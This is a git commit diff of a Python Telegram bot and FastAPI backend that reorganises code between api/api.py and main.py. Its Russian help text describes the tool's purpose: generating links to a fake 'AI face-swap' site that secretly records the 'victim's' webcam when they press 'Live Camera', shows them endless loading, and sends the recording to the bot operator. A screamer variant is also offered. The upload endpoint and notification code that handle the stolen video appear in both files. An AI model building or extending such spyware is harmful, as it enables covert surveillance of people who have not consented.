ef768c332fb1384076b36880ab5b062c97ab36c9
Fatum23 <dmitrijnaumov342@gmail.com>
2024-08-25 18:52:34 +0300

    dev

--- api/api.py
+++ api/api.py
@@ -1,34 +1,9 @@
 import os
-import telebot
-
-bot = telebot.TeleBot(os.environ.get("BOT_TOKEN"))
-
-@bot.message_handler(commands=['start', 'help'])
-def start_message(message):
-  bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')
-
-@bot.message_handler(commands=["gen"])
-def gen(message):
-    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')
-
-@bot.message_handler(commands=["gen_screamer"])
-def gen(message):
-    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')
-
-
-@bot.message_handler()
-def unknown_command(message):
-    bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")
-
-bot.infinity_polling()
-
-
-
+from main import sendNotification
 
 from fastapi import FastAPI, File, UploadFile
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
-from fastapi.staticfiles import StaticFiles
 
 
 app = FastAPI()
@@ -69,7 +44,8 @@ async def upload_video(video: UploadFile = File(...)):
             else:
                 creator_id = int(filename.split("-")[0])
             
-            bot.send_message(creator_id, "Жертва")
+            sendNotification(creator_id)
+            
             os.remove(os.path.join("/tmp", video.filename))
 
         # If the next chunk arrived, cancel the timeout task
--- main.py
+++ main.py
@@ -1,5 +1,31 @@
 import uvicorn
 
+import os
+import telebot
+
+bot = telebot.TeleBot(os.environ.get("BOT_TOKEN"))
+
+@bot.message_handler(commands=['start', 'help'])
+def start_message(message):
+  bot.send_message(message.chat.id,'Привет!\nЭтот бот генерирует ссылку на фейковый сайт с нейросетью которая якобы меняет твое лицо\nКогда жертва нажмет кнопку "Live Camera" начнется запись с веб камеры жертвы и будет отправлена этим ботом тебе, а тем временем у жертвы будет бесконечная загрузка\nТакже можно сгенерировать ссылку со скримером\n\n/gen - Сгенерировать ссылку без скримера\n/gen_screamer - Сгенерировать ссылку со скримером\n/help - Помощь')
+
+@bot.message_handler(commands=["gen"])
+def gen(message):
+    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}')
+
+@bot.message_handler(commands=["gen_screamer"])
+def gen(message):
+    bot.send_message(message.chat.id, f'https://anime-art-ai.vercel.app/?model={message.from_user.id}&v2=true')
+
+
+@bot.message_handler()
+def unknown_command(message):
+    bot.send_message(message.chat.id, "Я тебя не понимаю(\nНапиши /help")
+
+
+def sendNotification(creator_id: int):
+    bot.send_message(creator_id, "Жертва")
 
 if __name__ == "__main__":
+	bot.infinity_polling() 
 	uvicorn.run("api.api:app", port=8000, reload=True)
